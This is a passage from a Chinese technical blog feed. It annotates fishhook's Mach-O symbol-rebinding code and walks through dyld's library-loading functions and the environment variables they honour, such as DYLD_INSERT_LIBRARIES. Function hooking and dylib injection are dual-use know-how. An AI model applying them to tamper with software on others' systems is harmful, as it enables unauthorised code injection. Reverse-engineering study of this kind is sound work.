object</span></span><br><span class="line"><span class="comment">//                               is loaded */</span></span><br><span class="line"><span class="comment">//    const char *dli_sname;  /* Name of nearest symbol with address</span></span><br><span class="line"><span class="comment">//                               lower than addr */</span></span><br><span class="line"><span class="comment">//    void       *dli_saddr;  /* Exact address of symbol named</span></span><br><span class="line"><span class="comment">//                               in dli_sname */</span></span><br><span class="line"><span class="comment">//&#125; Dl_info;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rebind_symbols_for_image</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                     <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                     intptr_t slide)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//获取Dl_info</span></span><br><span class="line">  Dl_info info;</span><br><span class="line">  <span class="keyword">if</span> (dladdr(header, &amp;info) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> symtab_command* symtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> dysymtab_command* dysymtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">//在lc_segment中遍历寻找__LINKEDIT的section</span></span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_symtab</span></span><br><span class="line">      symtab_cmd = (<span class="keyword">struct</span> symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_dysymtab</span></span><br><span class="line">      dysymtab_cmd = (<span class="keyword">struct</span> dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检测必要的数据结构是否都存在</span></span><br><span class="line">  <span class="comment">/*</span><br><span class="line">  LC_SYMTAB这个LoadCommand主要提供了两个信息</span><br><span class="line">	Symbol Table的偏移量与Symbol Table中元素的个数</span><br><span class="line">	String Table的偏移量与String Table的长度</span><br><span class="line">  LC_DYSYMTAB</span><br><span class="line">	提供了动态符号表的位移和元素个数，还有一些其他的表格索引</span><br><span class="line">  LC_SEGMENT.__LINKEDIT</span><br><span class="line">	含有为动态链接库使用的原始数据</span><br><span class="line">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find base symbol/string table addresses</span></span><br><span class="line">  <span class="comment">// 获取链接时程序的基址</span></span><br><span class="line">  <span class="comment">// 基址 = __LINKEDIT.VM_Address - __LINK.File_Offset + silde的改变值</span></span><br><span class="line">  <span class="comment">// machoview随便看一个程序的__LINKEDIT</span></span><br><span class="line">  <span class="comment">// offset 	| data 					| Description 		| value</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 0x0000390	  0x0000000100002000	  VM Address		  4294975488</span></span><br><span class="line">  <span class="comment">// 0x0000398	  0x0000000000003000	  VM Size			  12288</span></span><br><span class="line">  <span class="comment">// 0x00003A0    0x0000000000002000	  File Offset		  8192</span></span><br><span class="line">  <span class="comment">// 0x00003A8    0x0000000000002690	  File Size			  9872</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// base = 100002000-2000 + slide = 0x0000000100000000 + slide</span></span><br><span class="line">  <span class="comment">// 这应该是一个公式</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> linkedit_base = (<span class="keyword">uintptr_t</span>)slide + linkedit_segment-&gt;vmaddr - linkedit_segment-&gt;fileoff;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 符号表的地址 = 基址 + 符号表偏移量</span></span><br><span class="line">  <span class="keyword">nlist_t</span> *symtab = (<span class="keyword">nlist_t</span> *)(linkedit_base + symtab_cmd-&gt;symoff);</span><br><span class="line">  <span class="comment">// 字符串表的地址 = 基址 + 字符串表偏移量</span></span><br><span class="line">  <span class="keyword">char</span> *strtab = (<span class="keyword">char</span> *)(linkedit_base + symtab_cmd-&gt;stroff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="comment">// 动态符号表地址 = 基址 + 动态符号表偏移量</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//再一次遍历loadcommands</span></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="comment">//找到__DATA和__DATA_CONST的section</span></span><br><span class="line">	  <span class="comment">//__DATA section里面保存的是符号跳转的函数指针表</span></span><br><span class="line">	  <span class="comment">// 对__nl_symbol_ptr以及__la_symbol_ptr进行rebind</span></span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _rebind_symbols_for_image(<span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                      <span class="keyword">intptr_t</span> slide) &#123;</span><br><span class="line">    rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span><br><span class="line">                         intptr_t slide,</span><br><span class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                         size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *rebindings_head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = prepend_rebindings(&amp;rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">    rebind_symbols_for_image(rebindings_head, header, slide);</span><br><span class="line">    <span class="built_in">free</span>(rebindings_head);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval = prepend_rebindings(&amp;_rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">  <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If this was the first call, register callback for image additions (which is also invoked for</span></span><br><span class="line">  <span class="comment">// existing images, otherwise, just run on existing images</span></span><br><span class="line">  <span class="keyword">if</span> (!_rebindings_head-&gt;next) &#123;</span><br><span class="line">    _dyld_register_func_for_add_image(_rebind_symbols_for_image);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c = _dyld_image_count();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; c; i++) &#123;</span><br><span class="line">      _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="小结">小结</h1><p>整个流程中最复杂的部分是<code>perform_rebinding_with_section</code>实现的功能。</p>
<p>简单的概括流程：</p>
<ul>
<li>通过<code>__la_symbol_ptr</code>的<code>reserved1</code>字段找到第一个需要动态绑定的符号在动态符号表中的位置。</li>
</ul>
<ul>
<li>通过<code>__la_symbol_ptr</code>中提供的数据找到在<code>symbol table</code>中的数据。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/__la_symbol_ptr.png" alt="图1"></p>
<p>图上可以看到<code>reserved1</code>被machoview工具修改成了<code>Indirect Sym Index</code>,他的值是3.</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/indirect symbols.png" alt="图2"></p>
<p>可以看到<strong>第四个</strong>就是需要延时绑定的符号开始的地方。上面的值是<strong>3</strong>。</p>
<p>因为<strong>0，1，2，3….</strong></p>
<p>所以找到了他在符号表中的<strong>偏移量</strong>。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/symbol%20table.png" alt="图3"></p>
<p>后面的逻辑就比较好理解了，找到目标函数，替换目标函数。</p>
<h1 id="PS">PS</h1><p>从<code>github</code>可以获取注释后的代码。</p>
<p><a href="https://github.com/turingH/fishhook_analysis" target="_blank" rel="external">https://github.com/turingH/fishhook_analysis</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">mach-o延时绑定</a><br>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[dyld源码分析-动态加载load]]></title>
    <link href="http://yoursite.com/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/"/>
    <id>http://yoursite.com/2016/03/16/dyld源码分析load/</id>
    <published>2016-03-16T19:13:52.000Z</published>
    <updated>2016-03-24T03:35:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>
<a id="more"></a>
<h1 id="0x01_为什么要分析Load函数">0x01 为什么要分析Load函数</h1><p>通过一个简单的图，可以看到<code>Load</code>函数的调用者都是哪些函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/CalledBy-load.png" alt="load调用"></p>
<p>除了前面提到的<code>loadInsertedDylib</code>函数之外接触的比较多的就是<code>dlopen</code>了，所以，可以看出<code>load</code>是<code>dyld</code>动态加载一个<code>Mach-O</code>文件的重要接口。在动态加载一个<code>Mach</code>-o文件的时候，最终都调用了<code>load</code>这个API。</p>
<h1 id="0x02_Load函数分析">0x02 Load函数分析</h1><p><code>Load</code>函数的实现为一系列的<code>loadPhase*</code>函数，主要可以分为这几个部分</p>
<ul>
<li>处理环境变量，生成各种搜索路径。</li>
<li>如果该<code>lib</code><strong>已经</strong>加载过，则利用<code>share_cache</code>中已经存在的<code>imageloader</code>实例。</li>
<li>如果该<code>lib</code>没有加载过，通过读取文件，将mach-o文件映射到内存中，生成<code>imageloader</code>的实例。</li>
</ul>
<h2 id="2-1_load">2.1 load</h2><p>通过一幅图可以简单的理解<code>load</code>函数的流程。<code>load</code>函数主要做的这几件事情：</p>
<ul>
<li><p>处理suffix字段。</p>
</li>
<li><p>通过<code>loadPhase0</code>函数从<code>share_cache</code>中加载<code>image</code>。</p>
</li>
<li><p>如果<code>share_cache</code>中<strong>不存在</strong><code>image</code>，则再使用<strong>不同的参数</strong>调用<code>loadPhase0</code>函数，通过<code>open</code>函数读取文件并加载<code>image</code>到内存中。</p>
</li>
<li><p>函数调用结束后的内存管理。</p>
<p>​</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/load.png" alt="load"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据所有的环境变量生成路径，去加载一个ImageLoader</span></span><br><span class="line"><span class="function">ImageLoader* <span class="title">load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	CRSetCrashLogMessage2(path);</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* orgPath = path;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">char</span> realPath[PATH_MAX];</span><br><span class="line">	<span class="comment">// when DYLD_IMAGE_SUFFIX is in used, do a realpath(), otherwise a load of "Foo.framework/Foo" will not match</span></span><br><span class="line">	<span class="comment">// 当设置了DYLD_IMAGE_SUFFIX字段，需要使用realpath来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ( gLinkContext.imageSuffix != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( realpath(path, realPath) != <span class="literal">NULL</span> )</span><br><span class="line">			path = realPath;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try all path permutations and check against existing loaded images</span></span><br><span class="line">	<span class="comment">// 尝试各种路径组合去加载image</span></span><br><span class="line">	ImageLoader* image = loadPhase0(path, orgPath, context, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try all path permutations and try open() until first success</span></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; exceptions;</span><br><span class="line">	image = loadPhase0(path, orgPath, context, &amp;exceptions);</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">    CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 加载成功内存处理*/</span></span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ( exceptions.size() == <span class="number">0</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_loadPhase0函数">2.2 loadPhase0函数</h2><p><code>loadPhase0</code>函数逻辑比较简单</p>
<ul>
<li>遍历<code>DYLD_ROOT_PATH</code>环境变量，生成加载路径，调用<code>loadPhase1</code>。</li>
<li>如果不存在<code>DYLD_ROOT_PATH</code>环境变量，则使用原始的路径</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// try root substitutions</span></span><br><span class="line"><span class="comment">// 主要处理DYLD_ROOT_PATH环境变量的功能，修饰Loadimage时候的path</span></span><br><span class="line"><span class="comment">// 运行完结之后执行loadPhase1</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// handle DYLD_ROOT_PATH which forces absolute paths to use a new root</span></span><br><span class="line">	<span class="keyword">if</span> ( (gLinkContext.rootPaths != <span class="literal">NULL</span>) &amp;&amp; (path[<span class="number">0</span>] == <span class="string">'/'</span>) ) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* rootPath = gLinkContext.rootPaths ; *rootPath != <span class="literal">NULL</span>; ++rootPath) &#123;</span><br><span class="line">			<span class="keyword">char</span> newPath[<span class="built_in">strlen</span>(*rootPath) + <span class="built_in">strlen</span>(path)+<span class="number">2</span>];</span><br><span class="line">			<span class="built_in">strcpy</span>(newPath, *rootPath);</span><br><span class="line">			<span class="built_in">strcat</span>(newPath, path);</span><br><span class="line">			ImageLoader* image = loadPhase1(newloadPhase1Path, orgPath, context, exceptions);</span><br><span class="line">			<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">				<span class="keyword">return</span> image;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase1(path, orgPath, context, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-3_loadPhase1">2.3 loadPhase1</h2><p><code>loadPhase</code>主要处理内容：</p>
<ul>
<li>通过<code>LD_LIBRARY_PATH</code>参数组成的所有路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>当无法通过<code>LD_LIBRARY_PATH</code>获取<code>image</code>时，则通过<code>DYLD_FRAMEWORK_PATH</code>与<code>DYLD_LIBRARY_PATH</code>组成的路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>如果上面两个流程都无法加载到image则通过原始路径通过<code>loadPhase3</code>尝试加载<code>image</code>。</li>
<li>如果依然无法加载到image则通过<code>DYLD_FALLBACK_FRAMEWORK_PATH</code>环境变量，组成路径最后尝试加载<code>image</code>。</li>
</ul>
<p>这里要<strong>注意一下</strong>，因为不同的分支使用的<code>Phase</code>函数有可能是不同的。同时该函数也确定了环境变量在动态加载时的优先级。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle LD_LIBRARY_PATH environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果存在LD_LIBRARY_PATH变量，优先通过LD_LIBRARY_PATH中设置的路径进行搜索和加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useLdLibraryPath &amp;&amp; (sEnv.LD_LIBRARY_PATH != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, <span class="literal">NULL</span>, sEnv.LD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle DYLD_ environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果使用了DYLD_FRAMEWORK_PATH或者sEnv.DYLD_LIBRARY_PATH，则使用这两个环境变量去加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ((sEnv.DYLD_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (sEnv.DYLD_LIBRARY_PATH != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, sEnv.DYLD_FRAMEWORK_PATH, sEnv.DYLD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="comment">// 如果上面的环境变量都没有设置，就使用原始地址去加载</span></span><br><span class="line">	<span class="comment">// 函数是loadphase3</span></span><br><span class="line">	image = loadPhase3(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try fallback paths during second time (will open file)</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* fallbackLibraryPaths = sEnv.DYLD_FALLBACK_LIBRARY_PATH;</span><br><span class="line">	<span class="keyword">if</span> ( (fallbackLibraryPaths != <span class="literal">NULL</span>) &amp;&amp; !context.useFallbackPaths )</span><br><span class="line">		fallbackLibraryPaths = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( !context.dontLoad  &amp;&amp; (exceptions != <span class="literal">NULL</span>) &amp;&amp; ((sEnv.DYLD_FALLBACK_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (fallbackLibraryPaths != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		